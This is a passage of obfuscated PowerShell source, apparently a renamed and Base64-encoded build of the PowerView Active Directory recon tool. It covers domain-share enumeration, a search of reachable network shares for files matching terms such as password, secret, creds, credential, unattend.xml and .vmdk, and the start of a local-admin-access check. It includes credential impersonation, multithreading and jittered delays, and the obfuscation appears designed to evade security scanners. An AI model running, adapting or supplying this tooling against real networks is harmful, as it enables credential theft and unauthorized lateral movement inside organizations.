                                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYQBjAGMAZQBzAHMAaQBuAGcAIABzAGgAYQByAGUAIABwAGEAdABoACAAJABQAGEAdABoACAAOgAgACQAXwA=')))
                                }
                            }
                            else {
                                ${_/\_/==\/\_/===\/}
                            }
                        }
                    }
                }
            }
            if (${__/\__/\/\/\_/\/==}) {
                _/==\_/\/=\_/==\/\
            }
        }
        ${__/=\___/\_/\__/\} = $Null
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                ${__/=\___/\_/\__/\} = __/\__/\/==\/==\_/ -Credential $Credential
            }
            else {
                ${__/=\___/\_/\__/\} = __/\__/\/==\/==\_/ -Credential $Credential -__/\/=\/==\/=\/=\_
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-DomainShare] Total number of hosts: $(${_/\/\/\/=\_/=\__/}.count)"
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUwBoAGEAcgBlAF0AIABEAGUAbABhAHkAOgAgACQARABlAGwAYQB5ACwAIABKAGkAdAB0AGUAcgA6ACAAJABKAGkAdAB0AGUAcgA=')))
            ${__/=\/=\/\_____/\} = 0
            ${/=\/=\_/\_/==\/=\} = New-Object System.Random
            ForEach (${__/\_/==\/\/=\/\_} in ${_/\/\/\/=\_/=\__/}) {
                ${__/=\/=\/\_____/\} = ${__/=\/=\/\_____/\} + 1
                sleep -Seconds ${/=\/=\_/\_/==\/=\}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-DomainShare] Enumerating server ${__/\_/==\/\/=\/\_} (${__/=\/=\/\_____/\} of $(${_/\/\/\/=\_/=\__/}.count))"
                icm -ScriptBlock ${__/\/==\/\/=\/\__} -ArgumentList ${__/\_/==\/\/=\/\_}, $CheckShareAccess, ${__/=\___/\_/\__/\}
            }
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUwBoAGEAcgBlAF0AIABVAHMAaQBuAGcAIAB0AGgAcgBlAGEAZABpAG4AZwAgAHcAaQB0AGgAIAB0AGgAcgBlAGEAZABzADoAIAAkAFQAaAByAGUAYQBkAHMA')))
            ${/===\/=\/\/\_/=\_} = @{
                'CheckShareAccess' = $CheckShareAccess
                'TokenHandle' = ${__/=\___/\_/\__/\}
            }
            _/=\/===\__/==\/\_ -/=\/\/\/=\__/\_/= ${_/\/\/\/=\_/=\__/} -____/\_/==\_/==\_/ ${__/\/==\/\/=\/\__} -_/===\/==\_/=\_/\_ ${/===\/=\/\/\_/=\_} -Threads $Threads
        }
    }
    END {
        if (${__/=\___/\_/\__/\}) {
            _/==\_/\/=\_/==\/\ -__/\__/\/\/\_/\/== ${__/=\___/\_/\__/\}
        }
    }
}
function Find-InterestingDomainShareFile {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        ${/=\/\/\/=\__/\_/=},
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $Include = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBwAGEAcwBzAHcAbwByAGQAKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAGUAbgBzAGkAdABpAHYAZQAqAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBhAGQAbQBpAG4AKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBsAG8AZwBpAG4AKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAGUAYwByAGUAdAAqAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBuAGEAdAB0AGUAbgBkACoALgB4AG0AbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHYAbQBkAGsA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBjAHIAZQBkAHMAKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBjAHIAZQBkAGUAbgB0AGkAYQBsACoA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGMAbwBuAGYAaQBnAA==')))),
        [ValidateNotNullOrEmpty()]
        [ValidatePattern('\\\\')]
        [Alias('Share')]
        [String[]]
        $SharePath,
        [String[]]
        $ExcludedShares = @('C$', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuACQA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgB0ACQA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEMAJAA=')))),
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastAccessTime,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastWriteTime,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CreationTime,
        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $OfficeDocs,
        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $FreshEXEs,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        ${_/\/====\/\/=\_/=} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = ${__/===\/==\_/=\/\_} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = ${__/==========\_/=\} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ${_/\/\/\/=\_/=\__/} = ${/=\/\/\/=\__/\_/=}
        }
        else {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ASQBuAHQAZQByAGUAcwB0AGkAbgBnAEQAbwBtAGEAaQBuAFMAaABhAHIAZQBGAGkAbABlAF0AIABRAHUAZQByAHkAaQBuAGcAIABjAG8AbQBwAHUAdABlAHIAcwAgAGkAbgAgAHQAaABlACAAZABvAG0AYQBpAG4A')))
            ${_/\/\/\/=\_/=\__/} = __/\/\/=\/\_/==\/\ @_/\/====\/\/=\_/= | select -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-InterestingDomainShareFile] TargetComputers length: $(${_/\/\/\/=\_/=\__/}.Length)"
        if (${_/\/\/\/=\_/=\__/}.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ASQBuAHQAZQByAGUAcwB0AGkAbgBnAEQAbwBtAGEAaQBuAFMAaABhAHIAZQBGAGkAbABlAF0AIABOAG8AIABoAG8AcwB0AHMAIABmAG8AdQBuAGQAIAB0AG8AIABlAG4AdQBtAGUAcgBhAHQAZQA=')))
        }
        ${__/\/==\/\/=\/\__} = {
            Param(${/=\/\/\/=\__/\_/=}, $Include, $ExcludedShares, $OfficeDocs, ${___/=\/=\/=\___/=\}, $FreshEXEs, ${__/\_/=\/\____/=\_}, ${__/\__/\/\/\_/\/==})
            if (${__/\__/\/\/\_/\/==}) {
                $Null = __/\__/\/==\/==\_/ -__/\__/\/\/\_/\/== ${__/\__/\/\/\_/\/==} -__/\/=\/==\/=\/=\_
            }
            ForEach (${__/\_/==\/\/=\/\_} in ${/=\/\/\/=\__/\_/=}) {
                ${_/===\/\__/\_/===} = @()
                if (${__/\_/==\/\/=\/\_}.StartsWith('\\')) {
                    ${_/===\/\__/\_/===} += ${__/\_/==\/\/=\/\_}
                }
                else {
                    ${_/\/==\___/\/=\__} = Test-Connection -Count 1 -Quiet -ComputerName ${__/\_/==\/\/=\/\_}
                    if (${_/\/==\___/\/=\__}) {
                        ${/=\/=\/=\_/=====\} = ___/=\_/\_/=\/==== -/=\/\/\/=\__/\_/= ${__/\_/==\/\/=\/\_}
                        ForEach (${_/\_/==\/\_/===\/} in ${/=\/=\/=\_/=====\}) {
                            ${_/=\/\/\/\___/\/\} = ${_/\_/==\/\_/===\/}.Name
                            $Path = '\\'+${__/\_/==\/\/=\/\_}+'\'+${_/=\/\/\/\___/\/\}
                            if ((${_/=\/\/\/\___/\/\}) -and (${_/=\/\/\/\___/\/\}.Trim() -ne '')) {
                                if ($ExcludedShares -NotContains ${_/=\/\/\/\___/\/\}) {
                                    try {
                                        $Null = [IO.Directory]::GetFiles($Path)
                                        ${_/===\/\__/\_/===} += $Path
                                    }
                                    catch {
                                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABOAG8AIABhAGMAYwBlAHMAcwAgAHQAbwAgACQAUABhAHQAaAA=')))
                                    }
                                }
                            }
                        }
                    }
                }
                ForEach (${_/\_/==\/\_/===\/} in ${_/===\/\__/\_/===}) {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAaQBuAGcAIABzAGgAYQByAGUAOgAgACQAewBfAC8AXABfAC8APQA9AFwALwBcAF8ALwA9AD0APQBcAC8AfQA=')))
                    ${/==\/\__/=\/====\} = @{
                        'Path' = ${_/\_/==\/\_/===\/}
                        'Include' = $Include
                    }
                    if ($OfficeDocs) {
                        ${/==\/\__/=\/====\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAGYAaQBjAGUARABvAGMAcwA=')))] = $OfficeDocs
                    }
                    if ($FreshEXEs) {
                        ${/==\/\__/=\/====\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgByAGUAcwBoAEUAWABFAHMA')))] = $FreshEXEs
                    }
                    if ($LastAccessTime) {
                        ${/==\/\__/=\/====\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABBAGMAYwBlAHMAcwBUAGkAbQBlAA==')))] = $LastAccessTime
                    }
                    if ($LastWriteTime) {
                        ${/==\/\__/=\/====\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABXAHIAaQB0AGUAVABpAG0AZQA=')))] = $LastWriteTime
                    }
                    if ($CreationTime) {
                        ${/==\/\__/=\/====\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGkAbwBuAFQAaQBtAGUA')))] = $CreationTime
                    }
                    if (${__/\_/=\/\____/=\_}) {
                        ${/==\/\__/=\/====\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFcAcgBpAHQAZQBBAGMAYwBlAHMAcwA=')))] = ${__/\_/=\/\____/=\_}
                    }
                    __/\/\_/=\__/=\___ @/==\/\__/=\/====\
                }
            }
            if (${__/\__/\/\/\_/\/==}) {
                _/==\_/\/=\_/==\/\
            }
        }
        ${__/=\___/\_/\__/\} = $Null
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                ${__/=\___/\_/\__/\} = __/\__/\/==\/==\_/ -Credential $Credential
            }
            else {
                ${__/=\___/\_/\__/\} = __/\__/\/==\/==\_/ -Credential $Credential -__/\/=\/==\/=\/=\_
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-InterestingDomainShareFile] Total number of hosts: $(${_/\/\/\/=\_/=\__/}.count)"
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ASQBuAHQAZQByAGUAcwB0AGkAbgBnAEQAbwBtAGEAaQBuAFMAaABhAHIAZQBGAGkAbABlAF0AIABEAGUAbABhAHkAOgAgACQARABlAGwAYQB5ACwAIABKAGkAdAB0AGUAcgA6ACAAJABKAGkAdAB0AGUAcgA=')))
            ${__/=\/=\/\_____/\} = 0
            ${/=\/=\_/\_/==\/=\} = New-Object System.Random
            ForEach (${__/\_/==\/\/=\/\_} in ${_/\/\/\/=\_/=\__/}) {
                ${__/=\/=\/\_____/\} = ${__/=\/=\/\_____/\} + 1
                sleep -Seconds ${/=\/=\_/\_/==\/=\}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-InterestingDomainShareFile] Enumerating server ${__/\_/==\/\/=\/\_} (${__/=\/=\/\_____/\} of $(${_/\/\/\/=\_/=\__/}.count))"
                icm -ScriptBlock ${__/\/==\/\/=\/\__} -ArgumentList ${__/\_/==\/\/=\/\_}, $Include, $ExcludedShares, $OfficeDocs, ${___/=\/=\/=\___/=\}, $FreshEXEs, ${__/\_/=\/\____/=\_}, ${__/=\___/\_/\__/\}
            }
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ASQBuAHQAZQByAGUAcwB0AGkAbgBnAEQAbwBtAGEAaQBuAFMAaABhAHIAZQBGAGkAbABlAF0AIABVAHMAaQBuAGcAIAB0AGgAcgBlAGEAZABpAG4AZwAgAHcAaQB0AGgAIAB0AGgAcgBlAGEAZABzADoAIAAkAFQAaAByAGUAYQBkAHMA')))
            ${/===\/=\/\/\_/=\_} = @{
                'Include' = $Include
                'ExcludedShares' = $ExcludedShares
                'OfficeDocs' = $OfficeDocs
                'ExcludeHidden' = ${___/=\/=\/=\___/=\}
                'FreshEXEs' = $FreshEXEs
                'CheckWriteAccess' = ${__/\_/=\/\____/=\_}
                'TokenHandle' = ${__/=\___/\_/\__/\}
            }
            _/=\/===\__/==\/\_ -/=\/\/\/=\__/\_/= ${_/\/\/\/=\_/=\__/} -____/\_/==\_/==\_/ ${__/\/==\/\/=\/\__} -_/===\/==\_/=\_/\_ ${/===\/=\/\/\_/=\_} -Threads $Threads
        }
    }
    END {
        if (${__/=\___/\_/\__/\}) {
            _/==\_/\/=\_/==\/\ -__/\__/\/\/\_/\/== ${__/=\___/\_/\__/\}
        }
    }
}
function Find-LocalAdminAccess {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        ${/=\/\/\/=\__/\_/=},
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,
        [Switch]
        $CheckShareAccess,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        ${_/\/====\/\/=\_/=} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))] = ${__/==\/=\__/==\/==} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = ${__/===\/==\_/=\/\_} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = ${__/==========\_/=\} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ${_/\/\/\/=\_/=\__/} = ${/=\/\/\/=\__/\_/=}
        }
        else {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ATABvAGMAYQBsAEEAZABtAGkAbgBBAGMAYwBlAHMAcwBdACAAUQB1AGUAcgB5AGkAbgBnACAAYwBvAG0AcAB1AHQAZQByAHMAIABpAG4AIAB0AGgAZQAgAGQAbwBtAGEAaQBuAA==')))
            ${_/\/\/\/=\_/=\__/} = __/\/\/=\/\_/==\/\ @_/\/====\/\/=\_/= | select -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-LocalAdminAccess] TargetComputers length: $(${_/\/\/\/=\_/=\__/}.Length)"
        if (${_/\/\/\/=\_/=\__/}.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ATABvAGMAYQBsAEEAZABtAGkAbgBBAGMAYwBlAHMAcwBdACAATgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACAAdABvACAAZQBuAHUAbQBlAHIAYQB0AGUA')))
        }
        ${__/\/==\/\/=\/\__} = {
            Param(${/=\/\/\/=\__/\_/=}, ${__/\__/\/\/\_/\/==})
            if (${__/\__/\/\/\_/\/==}) {
                $Null = __/\__/\/==\/==\_/ -__/\__/\/\/\_/\/== ${__/\__/\/\/\_/\/==} -__/\/=\/==\/=\/=\_
            }
            ForEach (${__/\_/==\/\/=\/\_} in ${/=\/\/\/=\__/\_/=}) {
                ${_/\/==\___/\/=\__} = Test-Connection -Count 1 -Quiet -ComputerName ${__/\_/==\/\/=\/\_}
                if (${_/\/==\___/\/=\__}) {
                    ${_/=\/\__/====\/\_} = ________/=\/\_/=== -/=\/\/\/=\__/\_/= ${__/\_/==\/\/=\/\_}
